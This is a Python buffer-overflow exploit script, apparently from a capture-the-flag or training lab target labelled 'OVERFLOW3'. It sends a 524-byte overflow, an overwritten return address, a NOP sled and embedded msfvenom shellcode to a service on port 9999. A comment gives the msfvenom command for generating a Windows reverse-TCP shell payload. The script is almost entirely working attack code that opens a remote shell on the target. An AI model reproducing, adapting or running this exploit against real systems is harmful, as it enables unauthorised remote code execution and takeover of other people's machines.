import socket

ip = "10.10.56.156"
port = 9999

#prefix = "OVERFLOW3 "
offset = 524  #524
overflow = "A" * offset
#retn = "BBBB" # 311712F3
retn = "\xf3\x12\x17\x31"

#padding = ""
padding = "\x90" * 16


#add oyur payload by using the command below and paste in payload section
#msfvenom -p windows/shell_reverse_tcp LHOST=<Your IP> LPORT=4444 EXITFUNC=thread -b "\x00" -f c
payload = ("\xda\xc8\xbf\xd2\xb0\xb2\x0f\xd9\x74\x24\xf4\x58\x29\xc9\xb1"
"\x52\x83\xe8\xfc\x31\x78\x13\x03\xaa\xa3\x50\xfa\xb6\x2c\x16"
"\x05\x46\xad\x77\x8f\xa3\x9c\xb7\xeb\xa0\x8f\x07\x7f\xe4\x23"
"\xe3\x2d\x1c\xb7\x81\xf9\x13\x70\x2f\xdc\x1a\x81\x1c\x1c\x3d"
"\x01\x5f\x71\x9d\x38\x90\x84\xdc\x7d\xcd\x65\x8c\xd6\x99\xd8"
"\x20\x52\xd7\xe0\xcb\x28\xf9\x60\x28\xf8\xf8\x41\xff\x72\xa3"
"\x41\xfe\x57\xdf\xcb\x18\xbb\xda\x82\x93\x0f\x90\x14\x75\x5e"
"\x59\xba\xb8\x6e\xa8\xc2\xfd\x49\x53\xb1\xf7\xa9\xee\xc2\xcc"
"\xd0\x34\x46\xd6\x73\xbe\xf0\x32\x85\x13\x66\xb1\x89\xd8\xec"
"\x9d\x8d\xdf\x21\x96\xaa\x54\xc4\x78\x3b\x2e\xe3\x5c\x67\xf4"
"\x8a\xc5\xcd\x5b\xb2\x15\xae\x04\x16\x5e\x43\x50\x2b\x3d\x0c"
"\x95\x06\xbd\xcc\xb1\x11\xce\xfe\x1e\x8a\x58\xb3\xd7\x14\x9f"
"\xb4\xcd\xe1\x0f\x4b\xee\x11\x06\x88\xba\x41\x30\x39\xc3\x09"
"\xc0\xc6\x16\x9d\x90\x68\xc9\x5e\x40\xc9\xb9\x36\x8a\xc6\xe6"
"\x27\xb5\x0c\x8f\xc2\x4c\xc7\xba\x1b\xe7\x16\xd3\x19\xf7\x09"
"\x7f\x97\x11\x43\x6f\xf1\x8a\xfc\x16\x58\x40\x9c\xd7\x76\x2d"
"\x9e\x5c\x75\xd2\x51\x95\xf0\xc0\x06\x55\x4f\xba\x81\x6a\x65"
"\xd2\x4e\xf8\xe2\x22\x18\xe1\xbc\x75\x4d\xd7\xb4\x13\x63\x4e"
"\x6f\x01\x7e\x16\x48\x81\xa5\xeb\x57\x08\x2b\x57\x7c\x1a\xf5"
"\x58\x38\x4e\xa9\x0e\x96\x38\x0f\xf9\x58\x92\xd9\x56\x33\x72"
"\x9f\x94\x84\x04\xa0\xf0\x72\xe8\x11\xad\xc2\x17\x9d\x39\xc3"
"\x60\xc3\xd9\x2c\xbb\x47\xf9\xce\x69\xb2\x92\x56\xf8\x7f\xff"
"\x68\xd7\xbc\x06\xeb\xdd\x3c\xfd\xf3\x94\x39\xb9\xb3\x45\x30"
"\xd2\x51\x69\xe7\xd3\x73")
##bad char 00

#postfix = ""

buffer = overflow + retn + padding + payload #+ postfix
#buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
    s.connect((ip, port))
    print("Sending evil buffer...")
    s.send(buffer + "\r\n")
    print("Done!")
except:
    print("Could not connect.")
